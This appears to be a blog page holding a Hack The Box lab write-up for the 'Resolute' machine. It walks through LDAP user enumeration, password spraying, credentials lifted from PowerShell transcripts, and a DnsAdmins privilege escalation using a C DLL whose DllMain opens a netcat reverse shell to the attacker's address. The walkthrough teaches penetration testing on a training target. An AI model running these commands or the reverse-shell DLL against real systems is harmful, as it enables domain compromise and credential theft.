@@ -1,0 +1,819 @@
+<!doctype html>
+<!--
+  Minimal Mistakes Jekyll Theme 4.15.1 by Michael Rose
+  Copyright 2013-2019 Michael Rose - mademistakes.com | @mmistakes
+  Free for personal and commercial use under the MIT license
+  https://github.com/mmistakes/minimal-mistakes/blob/master/LICENSE
+-->
+<html lang="en" class="no-js">
+  <head>
+    <meta charset="utf-8">
+
+<!-- begin _includes/seo.html --><title>Resolute - Hack The Box - hackcommander.io</title>
+<meta name="description" content="We start Resolute with enumeration of the domain user accounts using an anonymous bind session to the LDAP server and find an initial password in the description field of one of the account. Password spraying the password against all the discovered accounts give us an initial shell then we pivot to another user after finding creds in a console history file. The priv esc is pretty cool: we’re in the DNS admins group so we can reconfigure the DNS service to run an arbitrary DLL as SYSTEM.">
+
+
+
+<meta property="og:type" content="article">
+<meta property="og:locale" content="en_US">
+<meta property="og:site_name" content="hackcommander.io">
+<meta property="og:title" content="Resolute - Hack The Box">
+<meta property="og:url" content="http://localhost:4000/htb-writeup-resolute/">
+
+
+  <meta property="og:description" content="We start Resolute with enumeration of the domain user accounts using an anonymous bind session to the LDAP server and find an initial password in the description field of one of the account. Password spraying the password against all the discovered accounts give us an initial shell then we pivot to another user after finding creds in a console history file. The priv esc is pretty cool: we’re in the DNS admins group so we can reconfigure the DNS service to run an arbitrary DLL as SYSTEM.">
+
+
+
+  <meta property="og:image" content="http://localhost:4000/assets/images/htb-writeup-resolute/resolute_logo.png">
+
+
+
+
+
+  <meta property="article:published_time" content="2020-05-30T00:00:00+02:00">
+
+
+
+
+
+  
+
+  
+
+
+<link rel="canonical" href="http://localhost:4000/htb-writeup-resolute/">
+
+
+
+
+
+
+
+  <script type="application/ld+json">
+    {
+      "@context": "https://schema.org",
+      "@type": "Person",
+      "name": "HackCommander",
+      "url": "http://localhost:4000",
+      "sameAs": null
+    }
+  </script>
+
+
+
+
+
+
+
+<!-- end _includes/seo.html -->
+
+
+<link href="/feed.xml" type="application/atom+xml" rel="alternate" title="hackcommander.io Feed">
+
+<!-- https://t.co/dKP3o1e -->
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+<script>
+  document.documentElement.className = document.documentElement.className.replace(/\bno-js\b/g, '') + ' js ';
+</script>
+
+<!-- For all browsers -->
+<link rel="stylesheet" href="/assets/css/main.css">
+
+<!--[if IE ]>
+  <style>
+    /* old IE unsupported flexbox fixes */
+    .greedy-nav .site-title {
+      padding-right: 3em;
+    }
+    .greedy-nav button {
+      position: absolute;
+      top: 0;
+      right: 0;
+      height: 100%;
+    }
+  </style>
+<![endif]-->
+
+
+
+    <!-- start custom head snippets -->
+
+<!-- insert favicons. use https://realfavicongenerator.net/ -->
+
+<!-- end custom head snippets -->
+
+  </head>
+
+  <body class="layout--single wide">
+
+    <!--[if lt IE 9]>
+<div class="notice--danger align-center" style="margin: 0;">You are using an <strong>outdated</strong> browser. Please <a href="https://browsehappy.com/">upgrade your browser</a> to improve your experience.</div>
+<![endif]-->
+
+    
+
+<div class="masthead">
+  <div class="masthead__inner-wrap">
+    <div class="masthead__menu">
+      <nav id="site-nav" class="greedy-nav">
+        
+          <a class="site-logo" href="/"><img src="/assets/images/masthead.png" alt=""></a>
+                
+        <ul class="visible-links"><li class="masthead__menu-item">
+              <a href="/" >Home</a>
+            </li><li class="masthead__menu-item">
+              <a href="/year-archive/" >Posts</a>
+            </li><li class="masthead__menu-item">
+              <a href="/categories/" >Categories</a>
+            </li><li class="masthead__menu-item">
+              <a href="/tags/" >Tags</a>
+            </li><li class="masthead__menu-item">
+              <a href="/about/" >About</a>
+            </li></ul>
+        
+        <button class="greedy-nav__toggle hidden" type="button">
+          <span class="visually-hidden">Toggle menu</span>
+          <div class="navicon"></div>
+        </button>
+        <ul class="hidden-links hidden"></ul>
+      </nav>
+    </div>
+  </div>
+</div>
+    
+
+    <div class="initial-content">
+      
+
+
+  
+    
+
+
+
+<nav class="breadcrumbs">
+  <ol itemscope itemtype="https://schema.org/BreadcrumbList">
+    
+    
+    
+      
+        <li itemprop="itemListElement" itemscope itemtype="https://schema.org/ListItem">
+          <a href="http://localhost:4000/" itemprop="item"><span itemprop="name">Home</span></a>
+          <meta itemprop="position" content="1" />
+        </li>
+        <span class="sep">/</span>
+      
+      
+        <li class="current">Resolute - Hack The Box</li>
+      
+    
+  </ol>
+</nav>
+
+  
+
+
+<div id="main" role="main">
+  
+  <div class="sidebar sticky">
+  
+
+
+<div itemscope itemtype="https://schema.org/Person">
+
+  
+    <div class="author__avatar">
+      
+
+      
+        <img src="/assets/images/avatar.png" alt="HackCommander" itemprop="image">
+      
+    </div>
+  
+
+  <div class="author__content">
+    
+      <h3 class="author__name" itemprop="name">HackCommander</h3>
+    
+    
+      <p class="author__bio" itemprop="description">
+        Pentester, Bug Bounty Hunter <br>and CTF Player
+      </p>
+    
+  </div>
+
+  <div class="author__urls-wrapper">
+    <button class="btn btn--inverse">Follow</button>
+    <ul class="author__urls social-icons">
+      
+        <li itemprop="homeLocation" itemscope itemtype="https://schema.org/Place">
+          <i class="fas fa-fw fa-map-marker-alt" aria-hidden="true"></i> <span itemprop="name">Spain</span>
+        </li>
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+        <li>
+          <a href="https://www.linkedin.com/in/iván-santos-malpica-1023a11b4" itemprop="sameAs" rel="nofollow noopener noreferrer">
+            <i class="fab fa-fw fa-linkedin" aria-hidden="true"></i> LinkedIn
+          </a>
+        </li>
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+        <li>
+          <a href="https://github.com/hackcommander" itemprop="sameAs" rel="nofollow noopener noreferrer">
+            <i class="fab fa-fw fa-github" aria-hidden="true"></i> GitHub
+          </a>
+        </li>
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      <!--
+  <li>
+    <a href="http://link-to-whatever-social-network.com/user/" itemprop="sameAs" rel="nofollow noopener noreferrer">
+      <i class="fas fa-fw" aria-hidden="true"></i> Custom Social Profile Link
+    </a>
+  </li>
+-->
+    </ul>
+  </div>
+</div>
+
+  
+  </div>
+
+
+  <article class="page" itemscope itemtype="https://schema.org/CreativeWork">
+    <meta itemprop="headline" content="Resolute - Hack The Box">
+    <meta itemprop="description" content="We start Resolute with enumeration of the domain user accounts using an anonymous bind session to the LDAP server and find an initial password in the description field of one of the account. Password spraying the password against all the discovered accounts give us an initial shell then we pivot to another user after finding creds in a console history file. The priv esc is pretty cool: we’re in the DNS admins group so we can reconfigure the DNS service to run an arbitrary DLL as SYSTEM.">
+    <meta itemprop="datePublished" content="May 30, 2020">
+    
+
+    <div class="page__inner-wrap">
+      
+        <header>
+          <h1 id="page-title" class="page__title" itemprop="headline">Resolute - Hack The Box
+</h1>
+          
+        </header>
+      
+
+      <section class="page__content" itemprop="text">
+        
+        <p class="page__meta">
+          
+            <i class="fa fa-fw fa-calendar" aria-hidden="true"></i> <time datetime="2020-05-30T00:00:00+02:00">May 30, 2020 </time>&emsp;
+          
+          
+        </p>
+        <p><img src="/assets/images/htb-writeup-resolute/resolute_logo.png" alt="" /></p>
+
+<p>We start Resolute with enumeration of the domain user accounts using an anonymous bind session to the LDAP server and find an initial password in the description field of one of the account. Password spraying the password against all the discovered accounts give us an initial shell then we pivot to another user after finding creds in a console history file. The priv esc is pretty cool: we’re in the DNS admins group so we can reconfigure the DNS service to run an arbitrary DLL as SYSTEM.</p>
+
+<h2 id="summary">Summary</h2>
+
+<ul>
+  <li>We can enumerate the AD users using LDAP or RID cycling with enum4linux</li>
+  <li>There’s a default credential in one of the LDAP field for a user</li>
+  <li>By password spraying this password across all discovered user accounts, we gain access as user melanie</li>
+  <li>The credentials for the ryan user are found in the powershell history file</li>
+  <li>User ryan is part of the DNS Admins group and we can replace the DNS service with a dll of our choosing</li>
+  <li>By controlling the dll, we have RCE as SYSTEM since the DNS service runs as SYSTEM</li>
+</ul>
+
+<h2 id="toolsblogs-used">Tools/Blogs used</h2>
+
+<ul>
+  <li><a href="https://github.com/ropnop/windapsearch">windapsearch</a></li>
+  <li><a href="https://github.com/fox-it/BloodHound.py">BloodHound.py</a></li>
+  <li><a href="https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/from-dnsadmins-to-system-to-domain-compromise">From DnsAdmins to SYSTEM to Domain Compromise</a></li>
+</ul>
+
+<h2 id="fails">Fails</h2>
+
+<ul>
+  <li>Tried to create and modify DNS records once I had access to user Ryan, thinking it was a similar priv esc path than another lab on HTB</li>
+  <li>Not keeping a “ready-to-go” DLL file handy. I had one on my previous Kali VM but didn’t copy it over so I wasted precious time building a new one.</li>
+</ul>
+
+<h2 id="recon---portscan">Recon - Portscan</h2>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@beholder:~/htb/resolute# nmap -p- 10.10.10.169
+Starting Nmap 7.80 ( https://nmap.org ) at 2019-12-07 14:03 EST
+Nmap scan report for resolute.htb (10.10.10.169)
+Host is up (0.025s latency).
+Not shown: 65512 closed ports
+PORT      STATE SERVICE
+53/tcp    open  domain
+88/tcp    open  kerberos-sec
+135/tcp   open  msrpc
+139/tcp   open  netbios-ssn
+389/tcp   open  ldap
+445/tcp   open  microsoft-ds
+464/tcp   open  kpasswd5
+593/tcp   open  http-rpc-epmap
+636/tcp   open  ldapssl
+3268/tcp  open  globalcatLDAP
+3269/tcp  open  globalcatLDAPssl
+5985/tcp  open  wsman
+9389/tcp  open  adws
+47001/tcp open  winrm
+49664/tcp open  unknown
+49665/tcp open  unknown
+49666/tcp open  unknown
+49667/tcp open  unknown
+49671/tcp open  unknown
+49676/tcp open  unknown
+49677/tcp open  unknown
+49688/tcp open  unknown
+49776/tcp open  unknown
+</code></pre></div></div>
+
+<h2 id="recon---enumerating-users">Recon - Enumerating users</h2>
+
+<p>Anonymous bind is allowed on the DC so I can use <code class="language-plaintext highlighter-rouge">windapsearch</code> to quickly get a list of all users on the system. This tool saves me the trouble of remembering the exact ldapsearch syntax (which I forget every single time).</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@beholder:~# windapsearch.py --dc-ip 10.10.10.169 -U
+[+] No username provided. Will try anonymous bind.
+[+] Using Domain Controller at: 10.10.10.169
+[+] Getting defaultNamingContext from Root DSE
+[+]	Found: DC=megabank,DC=local
+[+] Attempting bind
+[+]	...success! Binded as: 
+[+]	 None
+
+[+] Enumerating all AD users
+[+]	Found 25 users: 
+
+cn: Guest
+
+cn: DefaultAccount
+
+cn: Ryan Bertrand
+userPrincipalName: ryan@megabank.local
+
+cn: Marko Novak
+userPrincipalName: marko@megabank.local
+
+cn: Sunita Rahman
+userPrincipalName: sunita@megabank.local
+
+cn: Abigail Jeffers
+userPrincipalName: abigail@megabank.local
+
+cn: Marcus Strong
+userPrincipalName: marcus@megabank.local
+
+cn: Sally May
+userPrincipalName: sally@megabank.local
+
+cn: Fred Carr
+userPrincipalName: fred@megabank.local
+
+cn: Angela Perkins
+userPrincipalName: angela@megabank.local
+
+cn: Felicia Carter
+userPrincipalName: felicia@megabank.local
+
+cn: Gustavo Pallieros
+userPrincipalName: gustavo@megabank.local
+
+cn: Ulf Berg
+userPrincipalName: ulf@megabank.local
+
+cn: Stevie Gerrard
+userPrincipalName: stevie@megabank.local
+
+cn: Claire Norman
+userPrincipalName: claire@megabank.local
+
+cn: Paulo Alcobia
+userPrincipalName: paulo@megabank.local
+
+cn: Steve Rider
+userPrincipalName: steve@megabank.local
+
+cn: Annette Nilsson
+userPrincipalName: annette@megabank.local
+
+cn: Annika Larson
+userPrincipalName: annika@megabank.local
+
+cn: Per Olsson
+userPrincipalName: per@megabank.local
+
+cn: Claude Segal
+userPrincipalName: claude@megabank.local
+
+cn: Melanie Purkis
+userPrincipalName: melanie@megabank.local
+
+cn: Zach Armstrong
+userPrincipalName: zach@megabank.local
+
+cn: Simon Faraday
+userPrincipalName: simon@megabank.local
+
+cn: Naoki Yamamoto
+userPrincipalName: naoki@megabank.local
+
+[*] Bye!
+</code></pre></div></div>
+
+<p>I did another search in the LDAP directory but this time looking at the description because sometimes we can find additonial useful information in there. Here I see that the <code class="language-plaintext highlighter-rouge">marko</code> user has a note about the password being set to <code class="language-plaintext highlighter-rouge">Welcome123!</code></p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@beholder:~# windapsearch.py --dc-ip 10.10.10.169 --attrs sAMAccountName,description -U
+[+] No username provided. Will try anonymous bind.
+[+] Using Domain Controller at: 10.10.10.169
+[+] Getting defaultNamingContext from Root DSE
+[+]	Found: DC=megabank,DC=local
+[+] Attempting bind
+[+]	...success! Binded as: 
+[+]	 None
+
+[+] Enumerating all AD users
+[+]	Found 25 users: 
+
+[...]
+description: Account created. Password set to Welcome123!
+sAMAccountName: marko
+[...]
+</code></pre></div></div>
+
+<h2 id="password-spraying---access-to-user-melanie">Password spraying - Access to user Melanie</h2>
+
+<p>The credentials <code class="language-plaintext highlighter-rouge">marko / Welcome123!</code> don’t work with either SMB or WinRM:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@beholder:~# evil-winrm -u marko -p Welcome123! -i 10.10.10.169
+Evil-WinRM shell v2.0
+Info: Establishing connection to remote endpoint
+Error: An error of type WinRM::WinRMAuthorizationError happened, message is WinRM::WinRMAuthorizationError
+
+root@beholder:~# smbmap -u marko -p Welcome123! -H 10.10.10.169
+[+] Finding open SMB ports....
+[!] Authentication error on 10.10.10.169
+</code></pre></div></div>
+
+<p>The password could be used by another account on the system so I’ll use crackmapexec to try that password across all the accounts. I’ll save my list of users to <code class="language-plaintext highlighter-rouge">users.txt</code> and use it with CME.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@beholder:~/htb/resolute# crackmapexec smb 10.10.10.169 -u users.txt -p Welcome123!
+SMB         10.10.10.169    445    RESOLUTE         [*] Windows Server 2016 Standard 14393 x64 (name:RESOLUTE) (domain:MEGABANK) (signing:True) (SMBv1:True)
+[...]
+SMB         10.10.10.169    445    RESOLUTE         [+] MEGABANK\melanie:Welcome123!
+</code></pre></div></div>
+
+<p>Bingo, we got the password for Melanie’s account.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@beholder:~/htb/resolute# evil-winrm -u melanie -p Welcome123! -i 10.10.10.169
+
+Evil-WinRM shell v2.0
+
+Info: Establishing connection to remote endpoint
+
+*Evil-WinRM* PS C:\Users\melanie\Documents&gt; type ..\desktop\user.txt
+0c3be45f[...]
+</code></pre></div></div>
+
+<h2 id="powershell-transcripts---getting-access-as-user-ryan">Powershell transcripts - Getting access as user ryan</h2>
+
+<p>Looking around the filesystem, I found the Powershell transcripts in the <code class="language-plaintext highlighter-rouge">C:\pstranscripts\20191203</code> directory. They contain a <code class="language-plaintext highlighter-rouge">net use</code> command that <code class="language-plaintext highlighter-rouge">ryan</code> used to mount a remote file share. Unfortunately for him, he specified the credentials in the command so I can see them in plaintext in the transcript file: <code class="language-plaintext highlighter-rouge">ryan / Serv3r4Admin4cc123!</code></p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>*Evil-WinRM* PS C:\pstranscripts\20191203&gt; type PowerShell_transcript.RESOLUTE.OJuoBGhU.20191203063201.txt
+**********************
+Windows PowerShell transcript start
+Start time: 20191203063201
+Username: MEGABANK\ryan
+RunAs User: MEGABANK\ryan
+[...]
+**********************
+Command start time: 20191203063515
+**********************
+PS&gt;CommandInvocation(Invoke-Expression): "Invoke-Expression"
+&gt;&gt; ParameterBinding(Invoke-Expression): name="Command"; value="cmd /c net use X: \\fs01\backups ryan Serv3r4Admin4cc123!
+</code></pre></div></div>
+
+<p>After getting access to the <code class="language-plaintext highlighter-rouge">ryan</code> user account, I found a note in his desktop folder talking about changes automatically being reverted.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@beholder:~/htb/resolute# evil-winrm -u ryan -p Serv3r4Admin4cc123! -i 10.10.10.169
+Evil-WinRM shell v2.0
+Info: Establishing connection to remote endpoint
+
+*Evil-WinRM* PS C:\Users\ryan\Documents&gt; dir ../desktop
+    Directory: C:\Users\ryan\desktop
+
+Mode                LastWriteTime         Length Name
+----                -------------         ------ ----
+-ar---        12/3/2019   7:34 AM            155 note.txt
+
+*Evil-WinRM* PS C:\Users\ryan\Documents&gt; type ../desktop/note.txt
+Email to team:
+
+- due to change freeze, any system changes (apart from those to the administrator account) will be automatically reverted within 1 minute
+</code></pre></div></div>
+
+<h2 id="privesc-using-the-dns-service">Privesc using the DNS service</h2>
+
+<p>Our <code class="language-plaintext highlighter-rouge">ryan</code> user is part of the <code class="language-plaintext highlighter-rouge">Contractors</code> domain group.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>*Evil-WinRM* PS C:\Users\ryan\Documents&gt; net user ryan
+User name                    ryan
+Full Name                    Ryan Bertrand
+[...]
+Local Group Memberships      
+Global Group memberships     *Domain Users         *Contractors          
+The command completed successfully.
+</code></pre></div></div>
+
+<p>I used the python BloodHound ingestor to dump the info in BloodHound and see if I could pick up anything interesting to exploit.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@beholder:~/opt/BloodHound.py# ./bloodhound.py -c all -u ryan -p Serv3r4Admin4cc123! --dns-tcp -d megabank.local -dc megabank.local -gc megabank.local -ns 10.10.10.169
+INFO: Found AD domain: megabank.local
+INFO: Connecting to LDAP server: megabank.local
+INFO: Found 1 domains
+INFO: Found 1 domains in the forest
+INFO: Found 2 computers
+INFO: Connecting to LDAP server: megabank.local
+INFO: Found 27 users
+INFO: Found 50 groups
+INFO: Found 0 trusts
+INFO: Starting computer enumeration with 10 workers
+INFO: Querying computer: MS02.megabank.local
+INFO: Querying computer: Resolute.megabank.local
+INFO: Done in 00M 03S
+</code></pre></div></div>
+
+<p><img src="/assets/images/htb-writeup-resolute/bloodhound.png" alt="" /></p>
+
+<p>As I suspected, user <code class="language-plaintext highlighter-rouge">ryan</code> is a member of two additional groups: <code class="language-plaintext highlighter-rouge">Remote Management Users</code> and <code class="language-plaintext highlighter-rouge">DnsAdmin</code>. I remember reading about a potential privilege escalation vector for users with <code class="language-plaintext highlighter-rouge">DnsAdmin</code> group access.</p>
+
+<p>Spotless has a great <a href="https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/from-dnsadmins-to-system-to-domain-compromise">blog post</a> that covers this priv esc. In a nutshell, we can ask the machine to load an arbitrary DLL file when the service starts so that gives us RCE as SYSTEM. Because we’re in the <code class="language-plaintext highlighter-rouge">DnsAdmins</code> group, we can re-configure the service and we have the required privileges to restart it.</p>
+
+<p>Here’s a quick DLL file that just calls netcat to get a reverse shell.</p>
+
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">#include "stdafx.h"
+#include &lt;stdlib.h&gt;
+</span>
+<span class="n">BOOL</span> <span class="n">APIENTRY</span> <span class="nf">DllMain</span><span class="p">(</span><span class="n">HMODULE</span> <span class="n">hModule</span><span class="p">,</span>
+	<span class="n">DWORD</span>  <span class="n">ul_reason_for_call</span><span class="p">,</span>
+	<span class="n">LPVOID</span> <span class="n">lpReserved</span>
+<span class="p">)</span>
+<span class="p">{</span>
+	<span class="k">switch</span> <span class="p">(</span><span class="n">ul_reason_for_call</span><span class="p">)</span>
+	<span class="p">{</span>
+	<span class="k">case</span> <span class="n">DLL_PROCESS_ATTACH</span><span class="p">:</span>
+		<span class="n">system</span><span class="p">(</span><span class="s">"c:</span><span class="se">\\</span><span class="s">windows</span><span class="se">\\</span><span class="s">system32</span><span class="se">\\</span><span class="s">spool</span><span class="se">\\</span><span class="s">drivers</span><span class="se">\\</span><span class="s">color</span><span class="se">\\</span><span class="s">nc.exe -e cmd.exe 10.10.14.51 5555"</span><span class="p">);</span>
+	<span class="k">case</span> <span class="n">DLL_THREAD_ATTACH</span><span class="p">:</span>
+	<span class="k">case</span> <span class="n">DLL_THREAD_DETACH</span><span class="p">:</span>
+	<span class="k">case</span> <span class="n">DLL_PROCESS_DETACH</span><span class="p">:</span>
+		<span class="k">break</span><span class="p">;</span>
+	<span class="p">}</span>
+	<span class="k">return</span> <span class="n">TRUE</span><span class="p">;</span>
+<span class="p">}</span>
+</code></pre></div></div>
+
+<p>After compiling this, I upload both the DLL and netcat to the machine.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>*Evil-WinRM* PS C:\windows\system32\spool\drivers\color&gt; upload /root/htb/resolute/nc.exe
+Info: Uploading /root/htb/resolute/nc.exe to C:\windows\system32\spool\drivers\color\nc.exe
+
+Data: 53248 bytes of 53248 bytes copied
+
+Info: Upload successful!
+
+*Evil-WinRM* PS C:\windows\system32\spool\drivers\color&gt; upload /root/htb/resolute/pwn.dll
+Info: Uploading /root/htb/resolute/pwn.dll to C:\windows\system32\spool\drivers\color\pwn.dll
+
+Data: 305604 bytes of 305604 bytes copied
+
+Info: Upload successful!
+</code></pre></div></div>
+
+<p>Next, I’ll reconfigure the dns service and restart it.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>*Evil-WinRM* PS C:\windows\system32\spool\drivers\color&gt; cmd /c 'dnscmd RESOLUTE /config /serverlevelplugindll C:\Windows\System32\spool\drivers\color\pwn.dll'
+
+Registry property serverlevelplugindll successfully reset.
+Command completed successfully.
+
+*Evil-WinRM* PS C:\windows\system32\spool\drivers\color&gt; cmd /c "sc stop dns"
+
+SERVICE_NAME: dns 
+        TYPE               : 10  WIN32_OWN_PROCESS  
+        STATE              : 3  STOP_PENDING 
+                                (STOPPABLE, PAUSABLE, ACCEPTS_SHUTDOWN)
+        WIN32_EXIT_CODE    : 0  (0x0)
+        SERVICE_EXIT_CODE  : 0  (0x0)
+        CHECKPOINT         : 0x0
+        WAIT_HINT          : 0x0
+*Evil-WinRM* PS C:\windows\system32\spool\drivers\color&gt; cmd /c "sc start dns"
+
+SERVICE_NAME: dns 
+        TYPE               : 10  WIN32_OWN_PROCESS  
+        STATE              : 2  START_PENDING 
+                                (NOT_STOPPABLE, NOT_PAUSABLE, IGNORES_SHUTDOWN)
+        WIN32_EXIT_CODE    : 0  (0x0)
+        SERVICE_EXIT_CODE  : 0  (0x0)
+        CHECKPOINT         : 0x0
+        WAIT_HINT          : 0x7d0
+        PID                : 3500
+        FLAGS
+</code></pre></div></div>
+
+<p>This triggers the DLL and I get a reverse shell as SYSTEM:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@beholder:~/htb/resolute# rlwrap nc -lvnp 5555
+Ncat: Version 7.80 ( https://nmap.org/ncat )
+Ncat: Listening on :::5555
+Ncat: Listening on 0.0.0.0:5555
+Ncat: Connection from 10.10.10.169.
+Ncat: Connection from 10.10.10.169:56778.
+Microsoft Windows [Version 10.0.14393]
+(c) 2016 Microsoft Corporation. All rights reserved.
+
+C:\Windows\system32&gt;whoami
+nt authority\system
+
+C:\Windows\system32&gt;type c:\users\administrator\desktop\root.txt
+e1d9487[...]
+</code></pre></div></div>
+
+        
+      </section>
+
+      <footer class="page__meta">
+        
+        
+  
+
+
+  
+  
+  
+
+  <p class="page__taxonomy">
+    <strong><i class="fas fa-fw fa-tags" aria-hidden="true"></i> Tags: </strong>
+    <span itemprop="keywords">
+    
+      
+      
+      <a href="/tags/#bloodhound" class="page__taxonomy-item" rel="tag">bloodhound</a><span class="sep">, </span>
+    
+      
+      
+      <a href="/tags/#creds-in-plaintext" class="page__taxonomy-item" rel="tag">creds in plaintext</a><span class="sep">, </span>
+    
+      
+      
+      <a href="/tags/#dns" class="page__taxonomy-item" rel="tag">dns</a><span class="sep">, </span>
+    
+      
+      
+      <a href="/tags/#password-spray" class="page__taxonomy-item" rel="tag">password spray</a><span class="sep">, </span>
+    
+      
+      
+      <a href="/tags/#rid-cycling" class="page__taxonomy-item" rel="tag">rid cycling</a>
+    
+    </span>
+  </p>
+
+
+
+
+  
+
+
+  
+  
+  
+
+  <p class="page__taxonomy">
+    <strong><i class="fas fa-fw fa-folder-open" aria-hidden="true"></i> Categories: </strong>
+    <span itemprop="keywords">
+    
+      
+      
+      <a href="/categories/#hackthebox" class="page__taxonomy-item" rel="tag">hackthebox</a><span class="sep">, </span>
+    
+      
+      
+      <a href="/categories/#infosec" class="page__taxonomy-item" rel="tag">infosec</a>
+    
+    </span>
+  </p>
+
+
+        
+          <p class="page__date"><strong><i class="fas fa-fw fa-calendar-alt" aria-hidden="true"></i> Updated:</strong> <time datetime="2020-05-30T00:00:00+02:00">May 30, 2020</time></p>
+        
+      </footer>
+
+      
+
+      
+  <nav class="pagination">
+    
+      <a href="/htb-writeup-obscurity/" class="pagination--pager" title="Obscurity - Hack The Box
+">Previous</a>
+    
+    
+      <a href="/htb-writeup-poo/" class="pagination--pager" title="P.O.O. - Hack The Box
+">Next</a>
+    
+  </nav>
+
+    </div>
+
+    
+  </article>
+
+  
+</div>
+
+    </div>
+
+    
+
+    <div class="page__footer">
+      <footer>
+        <!-- start custom footer snippets -->
+
+<!-- end custom footer snippets -->
+        <div class="page__footer-follow">
+  <ul class="social-icons">
+    
+
+    
+
+    <li><a href="/feed.xml"><i class="fas fa-fw fa-rss-square" aria-hidden="true"></i> Feed</a></li>
+  </ul>
+</div>
+
+<div class="page__footer-copyright">&copy; 2022 HackCommander</div>
+
+      </footer>
+    </div>
+
+    
+  <script src="/assets/js/main.min.js"></script>
+  <script data-search-pseudo-elements defer src="https://use.fontawesome.com/releases/v5.7.1/js/all.js" integrity="sha384-eVEQC9zshBn0rFj4+TU78eNA19HMNigMviK/PU/FFjLXqa/GKPgX58rvt5Z8PLs7" crossorigin="anonymous"></script>
+
+
+
+
+
+
+
+
+  </body>
+</html>
